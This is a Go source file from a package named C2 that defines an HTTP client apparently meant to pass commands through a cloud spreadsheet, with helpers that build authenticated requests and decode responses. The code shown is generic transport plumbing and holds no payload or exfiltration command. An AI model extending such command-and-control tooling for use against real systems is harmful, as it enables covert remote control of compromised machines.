package C2

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
)

// HTTPClient interface
type HTTPClient interface {
	Do(req *http.Request) (*http.Response, error)
}

type Client struct {
	// BaseURL      *url.URL
	BaseURL      string
	UserAgent    string
	TenantId     string
	ClientId     string
	ClientSecret string
	DriveId      string
	SheetId      string
	SheetName    string
	TokenId      string
	HttpClient   HTTPClient
	APIKey       string
	Ticker       int
	TickerCell   string
	Commands     []Command
}

func (c *Client) newRequest(method, path string, body *bytes.Buffer, content string) (*http.Request, error) {
	if c.BaseURL == "" {
		return nil, errors.New("BaseURL is undefined")
	}

	u, _ := url.JoinPath(c.BaseURL, path)

	if body == nil {
		body = new(bytes.Buffer)
	}

	req, err := http.NewRequest(method, u, body)
	if err != nil {
		return nil, err
	}
	// Default request is json
	if content == "" {
		req.Header.Set("Content-Type", "application/json")
	} else {
		req.Header.Set("Content-Type", content)
	}
	req.Header.Set("User-Agent", c.UserAgent)
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", c.APIKey))
	return req, nil
}

func (c *Client) do(req *http.Request,
	v interface{}) (*http.Response, error) {
	resp, err := c.HttpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	err = json.NewDecoder(resp.Body).Decode(v)

	return resp, err
}

func (c *Client) do_noparse(req *http.Request) ([]byte, error) {
	resp, err := c.HttpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)

	return data, err
}
